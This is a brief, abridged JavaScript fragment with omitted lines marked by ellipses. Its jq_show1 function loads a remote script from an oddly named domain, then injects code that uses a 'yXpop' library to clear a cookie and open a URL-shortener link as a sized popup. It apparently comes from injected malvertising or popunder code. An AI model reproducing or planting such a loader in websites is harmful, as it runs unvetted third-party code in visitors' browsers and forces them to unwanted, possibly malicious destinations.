function jq_show1() {
    ...
    script1.src = "https://custodycraveretard.com/70/f1/d0/70f1d0d918d0dd1374a6cff26208bced.js";
    var done1 = false;
    script1.onload = script1.onreadystatechange = function () {
        if (!done1 && (!this.readyState || this.readyState === "loaded" || this.readyState === "complete")) {
            ...
            script2.text = 'yXpop.config({safe:true}); yXpop.Cookie.remove(\'yXpop0\'); yXpop.add(\'https://urlzs.com/BmLNM/\', {under: false, newTab: false, width: yx_w, height: yx_h, top: yx_t, left: yx_l });';
